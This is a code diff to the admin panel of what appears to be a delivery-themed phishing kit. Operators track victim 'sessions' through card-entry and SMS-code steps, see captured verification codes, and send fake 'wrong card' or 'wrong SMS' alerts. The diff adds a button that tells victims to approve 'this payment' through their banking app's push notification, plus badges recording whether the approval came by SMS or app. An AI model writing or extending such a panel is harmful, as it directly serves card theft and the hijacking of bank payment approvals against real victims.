@@ -20,7 +20,9 @@ import {
   LogOut,
   Settings,
   KeyRound,
-  CheckCircle
+  CheckCircle,
+  Smartphone,
+  MessageCircle
 } from "lucide-react";
 import { toast } from "@/hooks/use-toast";
 import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
@@ -46,6 +48,7 @@ interface ClientSession {
   admin_message: string | null;
   message_type: string | null;
   verification_code: string | null;
+  approval_type: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -139,7 +142,7 @@ const AdminPanel = () => {
     // Update step to confirmation
     const { error } = await supabase
       .from("client_sessions")
-      .update({ current_step: 4 })
+      .update({ current_step: 4, approval_type: "sms" })
       .eq("id", session.id);
 
     if (error) {
@@ -182,7 +185,7 @@ const AdminPanel = () => {
     // Update step to confirmation (for app-based approval without SMS)
     const { error } = await supabase
       .from("client_sessions")
-      .update({ current_step: 4 })
+      .update({ current_step: 4, approval_type: "app" })
       .eq("id", session.id);
 
     if (error) {
@@ -319,6 +322,30 @@ const AdminPanel = () => {
       toast({
         title: "Client Sent Back",
         description: "Wrong card alert sent, client returned to card page",
+      });
+    }
+  };
+
+  const sendRequestPushMessage = async (sessionId: string) => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "Please check your banking app for a push notification to approve this payment.",
+        message_type: "info"
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending message:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send message",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Message Sent",
+        description: "Push notification request sent to client",
       });
     }
   };
@@ -504,9 +531,26 @@ const AdminPanel = () => {
                             #{session.session_code}
                           </span>
                         </CardTitle>
-                        <Badge className={`${stepColors[session.current_step]} text-white`}>
-                          {stepNames[session.current_step]}
-                        </Badge>
+                        <div className="flex items-center gap-2">
+                          {session.current_step === 4 && session.approval_type && (
+                            <Badge 
+                              variant="outline" 
+                              className={session.approval_type === "sms" 
+                                ? "border-green-500 text-green-600 gap-1" 
+                                : "border-blue-500 text-blue-600 gap-1"
+                              }
+                            >
+                              {session.approval_type === "sms" ? (
+                                <><MessageCircle className="w-3 h-3" /> SMS</>
+                              ) : (
+                                <><Smartphone className="w-3 h-3" /> App</>
+                              )}
+                            </Badge>
+                          )}
+                          <Badge className={`${stepColors[session.current_step]} text-white`}>
+                            {stepNames[session.current_step]}
+                          </Badge>
+                        </div>
                       </div>
                     </CardHeader>
                     <CardContent className="space-y-4">
@@ -675,15 +719,26 @@ const AdminPanel = () => {
                               Wrong SMS
                             </Button>
                           </div>
-                          <Button
-                            variant="outline"
-                            size="sm"
-                            className="w-full gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
-                            onClick={() => sendWrongCardMessage(session.id)}
-                          >
-                            <CreditCard className="w-4 h-4" />
-                            Wrong Card
-                          </Button>
+                          <div className="grid grid-cols-2 gap-2">
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
+                              onClick={() => sendWrongCardMessage(session.id)}
+                            >
+                              <CreditCard className="w-4 h-4" />
+                              Wrong Card
+                            </Button>
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="gap-2 text-purple-600 border-purple-500 hover:bg-purple-500 hover:text-white"
+                              onClick={() => sendRequestPushMessage(session.id)}
+                            >
+                              <Smartphone className="w-4 h-4" />
+                              Request Push
+                            </Button>
+                          </div>
                           {session.verification_code && (
                             <div className="p-2 rounded bg-muted text-center">
                               <span className="text-xs text-muted-foreground">Current Code: </span>
